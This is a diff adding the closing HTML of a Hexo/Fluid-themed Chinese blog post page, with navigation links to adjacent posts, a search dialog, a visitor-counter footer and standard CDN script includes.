+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/10/PwnTools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PwnTools使用方法学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/10/%E6%88%91%E7%9A%84%E6%A1%8C%E9%9D%A2/">
+                        <span class="hidden-mobile">我的桌面</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
